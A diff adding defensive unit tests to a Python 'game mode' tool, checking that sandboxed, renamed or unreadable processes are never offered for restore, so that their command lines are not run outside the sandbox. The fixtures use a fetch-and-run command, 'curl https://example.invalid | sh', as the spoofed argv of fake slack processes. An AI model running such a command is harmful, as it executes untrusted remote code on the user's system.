@@ -27,10 +27,16 @@ def load(state_home):
     return mod
 
 
-def proc(gm, pid, ppid, comm, argv, mb=0, exe=None):
+OWN = ("mnt:[1]", "user:[1]", "pid:[1]")         # this session's namespaces
+SANDBOX = ("mnt:[2]", "user:[2]", "pid:[2]")     # a Flatpak's
+
+
+def proc(gm, pid, ppid, comm, argv, mb=0, exe=None, ns=OWN, path=None):
     p = gm.Proc()
     p.pid, p.ppid, p.comm, p.argv, p.kb = pid, ppid, comm, argv, mb * 1024
     p.exe = exe or comm
+    p.path = "/usr/bin/" + p.exe if path is None else path
+    p.ns = ns
     return p
 
 
@@ -130,10 +136,47 @@ class GameModeTest(unittest.TestCase):
             proc(gm, 70, 10, "pipewire", ["pipewire"], mb=900),
             proc(gm, 80, 11, "slack", ["/usr/lib/slack/slack"], mb=300),
         ]
-        found = gm.apps({p.pid: p for p in ps})
+        found = gm.apps({p.pid: p for p in ps}, manager=10, own=OWN)
         self.assertEqual(sorted(found), ["chrome", "slack"])
         self.assertEqual(found["chrome"]["mb"], 1000)
         self.assertEqual(found["chrome"]["pids"], [20])
+
+    def test_sandboxed_processes_are_never_offered(self):
+        """Their command line would be run on restore, outside the sandbox."""
+        gm = self.gm
+        evil = ["/usr/bin/sh", "-c", "curl https://example.invalid | sh"]
+        ps = [
+            proc(gm, 10, 1, "systemd", ["/usr/lib/systemd/systemd", "--user"], path=""),  # unreadable, as for real
+            proc(gm, 11, 10, "Hyprland", ["Hyprland"]),
+            # A Flatpak calls itself systemd, then Hyprland, and starts a big child named slack.
+            proc(gm, 20, 10, "bwrap", ["bwrap", "--args", "37", "slack"], mb=10),
+            proc(gm, 21, 20, "systemd", ["systemd"], exe="systemd", path="/usr/lib/systemd/systemd", ns=SANDBOX),
+            proc(gm, 22, 21, "slack", evil, mb=900, exe="slack", ns=SANDBOX),
+            proc(gm, 23, 20, "Hyprland", ["Hyprland"], exe="Hyprland", ns=SANDBOX),
+            proc(gm, 24, 23, "slack", evil, mb=900, exe="slack", ns=SANDBOX),
+            # A process of this session that renamed itself Hyprland; its program says otherwise.
+            proc(gm, 30, 1, "Hyprland", ["/opt/x/x"], mb=10, exe="x"),
+            proc(gm, 31, 30, "slack", evil, mb=900, exe="slack"),
+            # Same mount namespace, own user namespace (how a browser sandboxes its renderers).
+            proc(gm, 40, 11, "slack", evil, mb=900, exe="slack", ns=("mnt:[1]", "user:[3]", "pid:[3]")),
+            # Namespaces that can't be read.
+            proc(gm, 50, 11, "slack", evil, mb=900, exe="slack", ns=None),
+        ]
+        self.assertEqual(gm.apps({p.pid: p for p in ps}, manager=10, own=OWN), {})
+
+    def test_the_service_manager_is_known_by_its_pid(self):
+        gm = self.gm
+        ps = [
+            proc(gm, 10, 1, "systemd", ["/usr/lib/systemd/systemd", "--user"], path=""),
+            proc(gm, 20, 10, "slack", ["/usr/lib/slack/slack"], mb=300),
+            # Our own process named systemd isn't the manager.
+            proc(gm, 30, 1, "systemd", ["/tmp/x"], exe="x"),
+            proc(gm, 31, 30, "chrome", ["/opt/google/chrome/chrome"], mb=900),
+        ]
+        procs = {p.pid: p for p in ps}
+        self.assertEqual(sorted(gm.apps(procs, manager=10, own=OWN)), ["slack"])
+        self.assertEqual(gm.apps(procs, manager=0, own=OWN), {})
+        self.assertEqual(gm.apps(procs, manager=10, own=None), {})
 
     # ------------------------------------------------------------ docker
 
